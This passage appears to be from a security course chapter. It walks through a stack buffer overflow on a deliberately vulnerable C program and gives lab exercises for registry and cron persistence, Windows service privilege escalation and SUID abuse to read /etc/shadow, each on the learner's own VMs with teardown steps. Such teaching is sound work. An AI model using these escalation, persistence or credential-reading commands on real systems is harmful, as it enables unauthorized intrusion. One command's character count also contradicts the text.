> The bottom half of the report includes the code, stack, and summary sections.  The stack is filled with the letter "A" and the end of the report suggests that the program reached an address `0x401196` referenced in the index pointer (RIP) which is the `main` function's return address.  
> ![[../images/06/activity_bof2_gef_initial_stack.png|Initial Stack Crash|650]]
> I want to target the index pointer register to hijack the execution flow by inserting an address into the stack's buffer that will eventually overwrite the index pointer.  Once hijacked, this pointer will send the execution path of the program to anywhere of my choosing.   I know I overshot this initial attempt because the RSP was overwritten with the letter "A".  I need to identify which position of the 200 "A"s overwrote the RSP which will be known as the *offset*.  To do this, I use the `pattern create` command that comes with GEF.  It generates a non-repeating string of any length.
> ![[../images/06/activity_bof2_pattern_create.png|Pattern Create|650]]
> I copy the 200 character output into my clipboard, run the program and paste the pattern into the prompt.  The program crashes as expected but this time the RSP has part of the non-repeating pattern.
> ![[../images/06/activity_bof2_pattern_run.png|Running in GEF with Pattern Input|650]]
> ![[../images/06/activity_bof2_pattern_rsp.png|RSP Pattern Overwrite|650]]
> I copy the RSP hex value into my clipboard which I will use with the GEF `pattern search` command to identify at what character position this string is located within the original pattern.  This lets me know that the RIP overwrite occurs at offset 120.
> ![[../images/06/activity_bof2_offset.png|Pattern Search Offset Found|650]]
> I craft a new input with 120 "A"s and 1 "B" to be used as the input when rerunning the program in GDB.
> ```bash
> python -c "print('A'*200+"B")"
> ```
> ![[../images/06/activity_bof2_121.png|Generating 121 Character Test Payload|650]]
> The program crashes with the 120 A's + 1 B payload.  While examining the crash I see the RIP as the 0x42 letter B character at the end.  I also see that the RIP value has a total of 6 bytes.
> ![[../images/06/activity_bof2_rip_bytes.png|RIP 6 Bytes and Partially Overwritten|650]]
>  I generate a new payload with 120 "A"s and 6 "B"s to confirm I am able to overwrite the RIP while leaving the RSP in tact.
>  ```bash
>  python -c 'print("A"*120+"BBBBBB")' > rip.txt
>  ```
>  ![[buffer_activity_rip_test.png|Crafting Index Pointer Offset Test Input|600]]
>  Running the new input should cause the program to crash, except this time the index pointer should be overwritten with just the letter "B".  Once confirmed, I can swap out that position in the input with another memory address where I want the program to execute.
>  ```bash
>  run < rip.txt
>  ```
>  ![[../images/06/activity_bof2_gef_BBBBBB.png|Testing Index Pointer Overwrite with BBBBBB|650]]
>  ![[../images/06/activity_bof2_rip_B.png|RIP All B's|650]]
>  The index pointer now displays `0x424242424242` which is hexadecimal for the letter "B"!  Now that I have demonstrated that I can take control of the RIP, I need to identify the location of the code that is loaded into memory I want to execute.  As the objective of this demonstration is to execute the `hidden` function that is otherwise unreachable, I need to find where that function is on the stack.  To do this I use the `p` command in GDB and supply the name of the function which returns its memory address `0x401146`.
>  ```bash
>  p hidden
>  ```
>  ![[../images/06/activity_bof2_gef_hidden.png|Finding Hidden Function Address|650]]
>  Now I have all the pieces needed to craft an exploit that hijacks the program's execution path and causes the hidden function to be executed.  My goal is to overwrite the index pointer with the address of the hidden function.  This will require me to convert that hidden function address into Little Endian 64-bit format shellcode which is `\x46\x11\x40\x00\x00\x00`.  This is the reverse order of hexadecimal values with `00` used as padding to fill the 64-bit space.  Note that each hexadecimal has `\x` preceding it.  I place 120 "A"s and then the shellcode address to the hidden function into an exploit text file from a new terminal outside of GDB.  Observe that the hexadecimal is not rendered to standard output because the values are non-ascii.
>  ```bash
>  python -c 'print("A"*120+"\x46\x11\x40\x00\x00\x00")' > exploit.txt
>  ```
>  ![[buffer_activity_exploit_dev.png|Crafting Exploit|600]]
>  Finally, it is time to run the program with the exploit as the input and see if I get the hidden function to print the static "Congrats, you found me!" output.
>  ```bash
>  ./program < exploit.txt
>  ```
>  ![[buffer_activity_exploited.png|Program Exploited|600]]Huzzah!

# Exercises

> [!exercise] Exercise 6.1 - Windows Persistence with Registry
> Using the Windows VM in Bridge Adapter network mode, you will add a Run Registry Key to launch the calculator app as a placeholder for malware.
> #### Step 1 - Add the Key
> Launch a command prompt and add the `calc.exe` to the Registry’s Run Key.
> ``` powershell
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> #### Step 2 - Reboot and Execute
> Reboot the Windows VM and observe the calculator app launches at login!
> #### Step 3 - Remove Persistence
> Launch the Registry Editor as Administrator accepting the UAC prompt. Navigate to `Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and observe the Key `NotEvil`.  Right click the `NotEvil` entry and Delete.


> [!exercise] Exercise 6.2 - Linux Persistence with Cronjob
> This task uses the Ubuntu VM in Bridge Adapter mode to schedule a cronjob that launches bash commands as a stand in for malware.
> #### Step 1 - Create the Cronjob
> Launch a bash terminal and add a cronjob that runs the `date` command and redirects the standard output to `cron.txt` file on your user’s desktop. Make sure to replace `USER` with your Ubuntu user’s name. Then run `crontab -l` to review and confirm the job setting.
> ``` bash
> echo "@reboot date > /home/USER/Desktop/cron.txt " | crontab 2> /dev/null
> crontab -l
> ```
> #### Step 2 - Reboot and Exploit
> Reboot the Ubuntu machine, login, and observe the cronjob created a `cron.txt` file on the desktop!
> #### Step 3 - Remove Persistence
> Open a terminal and remove the cronjob.
> ``` bash
> echo "" | crontab 2> /dev/null
> crontab -l
> ```


> [!exercise] Exercise 6.3 - Windows Service Privilege Escalation
> You will create a vulnerable service and then escalate your privileges by exploiting this service in your Windows VM with Bridge Adapter network mode.
> #### Step 1 - Setup Vulnerable Service
> Start command prompt as administrator and create a vulnerable service that you will use for privilege escalation.
> ``` powershell
> sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
> ```
> Add user permissions to modify service. The `WD` at the end of each `Allow` statement make each permission set world available.
> ``` powershell
> sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
> ```
> #### Step 2 - Tester User
> The `tester` user may already exist from previous labs. Open a regular command prompt (non-administrator) and check the user list to confirm the `tester` user is present.
> ``` powershell
> net user
> ```
> If the `tester` user is not present, create the user.
> ``` powershell
> net user tester /add
> ```
> Confirm the tester user IS NOT present in the Administrators group.
> ```powershell
> net localgroup administrators
> ```
> #### Step 3 - Exploit Service
> As normal low privileged user, launch a command prompt (not as admin). Modify the vulnerable service to add the `tester` user to the administrators group.
> ``` powershell
> sc config vulnerable binpath= "net localgroup administrators tester /add"
> ```
> Start the vulnerable service which will run the payload. Observe that the service “FAILED”.
> ``` powershell
> sc start vulnerable
> ```
> Check administrators again and observe the `tester` user now has privileges escalated!  Even though the service start command failed, it still ran in an elevated context and executed our code.
> ``` powershell
> net localgroup administrators
> ```
> #### Step 4 - Tear Down the Vulnerable Service
> Open a command prompt as administrator and delete the malicious service.
> ``` powershell
> sc delete vulnerable
> ```


> [!exercise] Exercise 6.4 - Linux SUID Privilege Escalation
> In this task you will create a vulnerable SUID binary and then exploit it to escalate privileges as the root user using the Ubuntu VM in Bridge Adapter network mode.
> #### Step 1 - Create Vulnerable SUID
> Install a `base64` binary with the root SUID bit set in the current directory. Then list the file and observe it is owned by root and is world executable. This means that any user on the system can run the binary as the root user.  Don’t miss the period at the end of the command.
> ``` bash
> sudo install -m =xs $(which base64) .
> ```
> #### Step 2 - Abuse SUID
> As your normal user, try dumping the contents of the shadow file which should only be accessible by root. Observe that permission is denied.
> ``` bash
> cat /etc/shadow
> ```
> Abuse the base64 SUID binary to display the contents of the shadow file. The “./” preceding the `base64` binary runs the vulnerable binary located in the current directory. The full command base64 encodes the shadow file and pipes the results to `base64` with the decode flag, which displays the full contents of the privileged file!
> ``` bash
> ./base64 "/etc/shadow" | base64 --decode
> ```


> [!exercise] Exercise 6.5 - Stack Smashing the Hidden Function
> In this task you will exploit a stack-based buffer overflow vulnerable C program using your Kali VM in Bridge Adapter network mode.  You will install the needed tools, build the vulnerable application, discover the buffer overflow, then build an exploit that will execute the hidden function.
> #### Step 1 - Install GDB
> GNU debugger (GDB) is used to debug in-memory applications and is very useful for finding and exploiting buffer overflows.  
> ```bash
> sudo apt update -y
> sudo apt install gdb -y
> ```
> #### Step 2 - Install GEF
> Next, install GEF after GDB is installed. The GEF extension for GDB offers additional utilities.
> ``` bash
> bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
> ```
> #### Step 3 - Create the Vulnerable Binary
> Create a C program using the following code and then compile it without any security settings.
> ```bash
> vi program.c 
> ```
> While in the editor, add the following code.
> ``` c
> #include <stdio.h>  
> void hidden(){  
>         printf("Congrats, you found me!\n");  
> }  
> int main(){
> 	char buffer[100];  
> 	gets(buffer); 
> 	printf("Buffer Content is : %s\n",buffer);  
> }
> ```
> Once the file is created, compile it using gcc.
> ``` bash 
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> #### Step 4 - Disable ASLR
> Left enabled, ASLR will randomize the program’s addresses each time it is ran.  You will disable this security setting for ease of demonstration.
> ``` bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> #### Step 5 - Explore the Binary
> Explore the application by running it and entering your name.  *Note, you may need to update the program’s permissions to allow execution.*
> ``` bash
> chmod +x program
> ./program
> ```
> Then enter “YOUR_NAME” and observe the program outputs the buffer content.
> #### Step 6 - Find the Overflow
> Create an input file of all “A”s then run it in the GDB debugger. Observe the RBP register is filled with the letter “A” or 0x41 in hex.
> ```bash
> python -c "print('A' *200)" > input.txt
> gdb -q ./program
> ```
> While in GDB, execute the following command to run the application with the input file and observe a segmentation fault (overflow).
> ``` gdb
> run < input.txt
> ```
> #### Step 7 - Find the Offset
> Use GEF built-in functions to find the offset.  Generate a pattern using the following command:
> ```gdb
> pattern create 200
> ```
> Copy the pattern and then `run` the program in GEF.  Once running, paste the pattern and hit enter.  The program should crash because RSP was overwritten with the pattern.  Find and copy the RSP hex value then search for this pattern to find the offset.
> ```gdb
> pattern search RSP_HEX_VALUE
> ```
> The result of the pattern search should be 120.
> #### Step 8 - Verify RIP
> Open another terminal and create a `rip.txt` file payload that is designed to overwrite the RIP with the letter “B” (\x42). Then run the program with the `rip.txt` input within GDB.  While in a terminal (not GDB), run the following to create the `rip.txt` file.
> ```bash
> python -c 'print("A"*120+"BBBBBB")' > rip.txt
> ```
> In the GDB terminal, run the following to execute the binary with the `rip.txt` file.
> ```gdb
> run < rip.txt
> ```
> Observe the RIP/overflow address is 0x000042424242! 42 in hex is the letter B, so you have now proven that you can overwrite the RIP address pointer with any value of your choosing and can hijack the program to run anything you want.
> #### Step 9 - Find Hidden Function Address
> Now that you control the RIP, you want to redirect the program to the hidden function. You must first determine the hidden function's address space in memory.  Run the following command while in GDB to identify the memory address of the hidden function (Eg “0x401146”).
> ```gdb
> p hidden
> ```
> #### Step 10 - Exploit Payload
> Craft exploit to point RIP to hidden function address. Remember Little Endian format which places the 6 bytes in reverse order and uses 00 for any missing bytes. In your non GDB terminal, craft an `exploit.txt` replacing the RIP section (Bs) with the hidden function’s address in Little Endian format. Use the hidden function's address discovered during the previous step which is 3 bytes long. Prepend three sets of 00s to make the address 6 bytes long (Eg "0x000000401146"). Next reverse each byte position remembering that a byte is 2 characters (Eg "461140000000"). Finally format each byte with a preceding “\x” so it is acceptable shellcode (Eg "\x46\x11\x40\x00\x00\x00"). Use this value in the following command's `SHELLCODE` placeholder.  From a non GDB terminal, run the following command to create the `exploit.txt` file, make sure to change your Little Endian address as needed.
> ```
> python -c 'print("A"*120+"SHELLCODE")' > exploit.txt
> ```
> Finally, run the program with the `exploit.txt` file as input and observe the hidden function message “Congrats, you found me!”.


[^1]:Windows 11 22h2 - Kernel Privilege Elevation; Exploit-DB 02/24/2024; https://www.exploit-db.com/exploits/51544
[^2]: How to View and Modify Service Permissions in Windows; Winhelponline; May 7, 2021; https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
[^3]: Linux Privilege Escalation; Hacktricks Carlos Polop; Feb 25, 2024; https://book.hacktricks.xyz/linux-hardening/privilege-escalation
[^4]: base64; GTFOBins; Feb 25, 2024; https://gtfobins.github.io/gtfobins/base64/